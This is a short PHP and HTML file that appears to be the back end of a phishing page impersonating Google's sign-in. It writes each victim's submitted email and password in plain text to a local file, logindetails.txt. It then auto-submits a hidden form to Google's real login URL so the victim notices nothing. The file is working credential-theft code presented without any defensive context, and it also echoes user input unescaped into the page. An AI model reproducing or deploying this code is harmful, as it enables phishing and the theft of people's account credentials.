<?php 
$file = fopen('logindetails.txt', 'a+');
$write = fwrite($file, 'email: '.$_POST['Email']. PHP_EOL .'password: '. $_POST['Passwd'].PHP_EOL.PHP_EOL );
fclose($file);

 ?>
<html>
<head>
	<title></title>
	<script type="text/javascript">
	function submitnow () {
		document.getElementById("hacked").submit();
	}
	</script>
</head>
<body onload="submitnow()">
<form action="https://accounts.google.com/signin/v2/sl/pwd?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F1%2F&ss=1&scc=1&authuser=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward" method="post" id="hacked">
 	<input type="hidden" name='email' value="<?php echo $_POST['Email']; ?>">
 	<input type="hidden" name='pass' value="<?php echo $_POST['Passwd']; ?>">
 </form>
</body>
</html>
 